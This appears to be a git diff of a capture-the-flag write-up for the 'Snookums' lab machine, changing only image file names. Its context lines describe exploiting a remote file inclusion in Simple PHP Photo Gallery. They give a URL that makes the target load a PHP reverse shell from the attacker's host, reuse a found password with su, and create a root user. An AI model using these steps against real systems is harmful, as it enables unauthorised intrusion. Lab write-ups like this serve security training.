@@ -28,7 +28,7 @@ Lots of ports open.
 
 Port 80 was running a Simple PHP Photo Gallery instance:
 
-![](<../../../.gitbook/assets/image%20(1533).png>)
+![](../../../.gitbook/assets/snookums-1.png)
 
 This thing might be vulnerable to an RFI based on `searchsploit`:
 
@@ -51,11 +51,11 @@ The PoC is quite simple to test:
 
 And it does work since I can make the website send requests to my HTTP server:
 
-![](<../../../.gitbook/assets/image%20(3536).png>)
+![](../../../.gitbook/assets/snookums-3.png)
 
 To exploit this, we can just host a PHP reverse shell from PentestMonkey and make the website call it by visiting [http://192.168.197.58/image.php?img=http://192.168.45.177/rev.php](http://192.168.197.58/image.php?img=http://192.168.45.177/rev.php).
 
-![](<../../../.gitbook/assets/image%20(4007).png>)
+![](../../../.gitbook/assets/snookums-5.png)
 
 ## Privilege Escalation
 
@@ -124,7 +124,7 @@ HockSydneyCertify123
 
 Then, just use `su`:
 
-![](<../../../.gitbook/assets/image%20(2884).png>)
+![](../../../.gitbook/assets/snookums-2.png)
 
 Grab the user flag.
 
@@ -139,6 +139,6 @@ Grab the user flag.
 
 Using this, we can easily create a new root user.
 
-![](<../../../.gitbook/assets/image%20(3978).png>)
+![](../../../.gitbook/assets/snookums-4.png)
 
 Rooted!
